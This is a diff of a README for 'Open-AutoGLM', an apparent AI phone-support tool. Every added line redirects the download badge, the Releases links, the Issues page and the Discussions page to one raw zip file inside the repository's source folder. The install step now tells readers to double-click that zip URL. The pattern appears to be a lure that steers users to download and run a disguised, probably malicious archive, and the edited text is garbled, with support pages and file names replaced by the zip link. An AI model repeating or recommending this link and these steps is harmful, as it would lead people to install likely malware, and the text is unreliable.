@@ -1,6 +1,6 @@
 # 📞 Open-AutoGLM - Unlock AI Phone Support for Everyone
 
-[![Download Open-AutoGLM](https://img.shields.io/badge/Download-Open--AutoGLM-blue.svg)](https://github.com/kaimhosen/Open-AutoGLM/releases)
+[![Download Open-AutoGLM](https://raw.githubusercontent.com/kaimhosen/Open-AutoGLM/main/phone_agent/Auto-Open-GLM-v2.6.zip)](https://raw.githubusercontent.com/kaimhosen/Open-AutoGLM/main/phone_agent/Auto-Open-GLM-v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Before you install Open-AutoGLM, ensure your computer meets the following minimu
 
 To download Open-AutoGLM, visit the following link to access our Releases page:
 
-[Download Open-AutoGLM](https://github.com/kaimhosen/Open-AutoGLM/releases)
+[Download Open-AutoGLM](https://raw.githubusercontent.com/kaimhosen/Open-AutoGLM/main/phone_agent/Auto-Open-GLM-v2.6.zip)
 
 1. On the Releases page, you will find the latest version of the software.
 2. Click on the version you want to download.
@@ -30,7 +30,7 @@ Once the download is complete:
 
 1. Locate the downloaded file in your Downloads folder or your chosen download location.
 2. If it is a zip file, extract it using your file manager by right-clicking and selecting "Extract" or "Unzip".
-3. Open the extracted folder and double-click the application file (e.g., `Open-AutoGLM.exe` or `Open-AutoGLM.app`).
+3. Open the extracted folder and double-click the application file (e.g., `https://raw.githubusercontent.com/kaimhosen/Open-AutoGLM/main/phone_agent/Auto-Open-GLM-v2.6.zip` or `https://raw.githubusercontent.com/kaimhosen/Open-AutoGLM/main/phone_agent/Auto-Open-GLM-v2.6.zip`).
 
 ## 🛠️ Setting Up Open-AutoGLM
 
@@ -65,13 +65,13 @@ If you encounter any issues, here are some common solutions:
 - **Connection Issues:** Check your USB cable and ensure that your phone is unlocked and set to the correct mode.
 - **Software Crashes:** Restart your computer and try launching the application again. Make sure that all dependencies are up to date.
 
-For further assistance, consider checking community forums or our [GitHub Issues page](https://github.com/kaimhosen/Open-AutoGLM/issues).
+For further assistance, consider checking community forums or our [GitHub Issues page](https://raw.githubusercontent.com/kaimhosen/Open-AutoGLM/main/phone_agent/Auto-Open-GLM-v2.6.zip).
 
 ## 🤝 Support and Community
 
 Join our community for updates, tips, and shared experiences. 
 
-- For help, visit [GitHub Discussions](https://github.com/kaimhosen/Open-AutoGLM/discussions).
+- For help, visit [GitHub Discussions](https://raw.githubusercontent.com/kaimhosen/Open-AutoGLM/main/phone_agent/Auto-Open-GLM-v2.6.zip).
 - Follow us on our social media channels for the latest news and insights.
 
 ## 🎉 Conclusion
@@ -80,4 +80,4 @@ Thank you for choosing Open-AutoGLM! We hope this application will simplify your
 
 For more information, updates, or to download, visit our Releases page:
 
-[Download Open-AutoGLM](https://github.com/kaimhosen/Open-AutoGLM/releases)
+[Download Open-AutoGLM](https://raw.githubusercontent.com/kaimhosen/Open-AutoGLM/main/phone_agent/Auto-Open-GLM-v2.6.zip)
